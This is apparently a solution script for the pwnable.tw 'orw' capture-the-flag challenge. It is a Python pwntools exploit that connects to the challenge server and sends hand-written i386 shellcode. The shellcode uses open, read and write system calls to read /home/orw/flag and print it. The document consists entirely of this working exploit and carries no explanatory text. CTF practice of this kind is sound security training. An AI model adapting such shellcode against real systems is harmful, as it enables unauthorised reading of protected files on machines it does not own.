from pwn import *

#p = process('./orw')
p = remote("chall.pwnable.tw", 10001)
context.arch = 'i386'
data = '''
jmp path_str

open_file:
    pop ebx
    mov eax, 5
    xor ecx, ecx
    xor edx, edx
    int 0x80

    mov ebx, eax
    mov eax, 3
    mov ecx, esp
    mov edx, 0x100
    int 0x80

    mov eax, 4
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x100
    int 0x80

path_str:
    call open_file
    .asciz "/home/orw/flag"
'''
p.sendafter(b"shellcode:", asm(data))
p.interactive()